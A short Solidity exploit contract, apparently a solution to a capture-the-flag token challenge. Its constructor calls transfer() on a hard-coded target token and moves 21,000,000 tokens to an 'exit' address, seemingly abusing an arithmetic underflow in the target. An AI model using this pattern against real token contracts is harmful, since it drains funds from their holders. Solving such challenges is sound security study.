pragma solidity ^0.8.9;

interface IToken {
  function transfer(address _to, uint _value) external returns (bool);
  function balanceOf(address _owner) external view returns (uint balance);
}

contract Token {
  address targetAddress = 0x98239d02Cf997a9CAbB3c16d1f5D2d3261EdA140;
  address exitAddress = 0xB702DC679dCe8d27c77AC49A63B9A138B674929E;
  IToken targetContract;

  constructor () { 
    targetContract = IToken(targetAddress);
    targetContract.transfer(exitAddress, 21000000);
  }
}
